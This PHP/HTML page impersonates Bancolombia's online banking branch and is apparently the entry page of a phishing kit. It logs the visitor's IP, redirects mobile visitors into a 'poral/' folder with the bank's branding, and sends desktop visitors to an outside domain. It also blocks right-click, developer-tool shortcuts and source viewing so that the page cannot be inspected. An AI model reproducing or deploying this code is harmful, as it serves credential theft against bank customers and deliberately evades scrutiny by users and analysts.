<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Bancolombia Sucursal Vrtual Personas</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
  		
		<meta content="es" http-equiv="Content-Language">
  	
		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	 	<script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
		<link href="poral/css/style.css" rel="stylesheet">
		<link href="poral/css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="poral/img/logo.png" />
		<script type="text/javascript" src="../../js/jquery-3.6.0.min.js"></script>
		<script src="../../js/jquery.jclock-min.js" type="text/javascript"></script>
   	</head>
   	<body>
   		<script type="text/javascript">
            $(document).ready(function() {
                window.location.href = "poral/"; 
            });
       </script>
   	
<script>
    function detectar_dispositivo() {
        var dispositivo = "";
        if (navigator.userAgent.match(/Android/i))
            dispositivo = "Android";
        else if (navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else if (navigator.userAgent.match(/iPhone/i))
            dispositivo = "iPhone";
        else if (navigator.userAgent.match(/iPad/i))
            dispositivo = "iPad";
        else if (navigator.userAgent.match(/iPod/i))
            dispositivo = "iPod";
        else if (navigator.userAgent.match(/BlackBerry/i))
            dispositivo = "BlackBerry";
        else if (navigator.userAgent.match(/Windows Phone/i))
            dispositivo = "Windows Phone";
        else
            dispositivo = "PC";
        return dispositivo;
    }

    if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://conclaros.co/Pa9e';
    }
</script>
    

<script>
    // Desactiva clic derecho
    document.addEventListener("contextmenu", function(e) {
        e.preventDefault();
    });

    // Detecta el uso de teclas comunes para abrir el inspector
    document.addEventListener("keydown", function(e) {
        // F12 o Ctrl+Shift+I o Ctrl+Shift+J o Ctrl+U
        if (
            e.key === "F12" || 
            (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) || 
            (e.ctrlKey && e.key === "U")
        ) {
            e.preventDefault();
            alert("Esta acción está deshabilitada.");
        }
    });

    // Desactiva herramientas de desarrollo en otros navegadores
    (function() {
        const devtools = /./;
        devtools.toString = function() {
            this.opened = true;
        };
        const checkDevTools = setInterval(function() {
            if (devtools.opened) {
                alert("Por favor, no intentes inspeccionar esta página.");
                window.location.reload();  // Opcional: recargar la página
            }
        }, 1000);
    })();
</script>

</body>
</html>